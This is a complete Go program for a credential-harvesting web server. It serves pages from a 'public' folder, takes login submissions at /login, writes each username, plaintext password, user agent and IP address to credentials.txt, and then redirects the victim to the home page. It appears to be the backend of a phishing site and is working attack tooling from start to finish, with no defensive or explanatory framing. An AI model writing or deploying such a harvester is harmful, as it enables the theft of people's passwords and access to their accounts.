package main

import (
	"log"
	"net/http"
	"os"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request){
	logrus.WithFields(logrus.Fields{
		"time": 		time.Now().String(),
		"username":		r.FormValue("_user"),
		"password":		r.FormValue("_pass"),
		"user-agent":	r.UserAgent(),
		"ip_adderess":  r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w,r,"/",302)
}

func main() {
	fh, err := os.OpenFile("credentials.txt",os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if(err != nil){
		logrus.Errorf("Could not open file credentials.txt")
		return
	}

	defer fh.Close()
	logrus.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login",login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080",r))
}
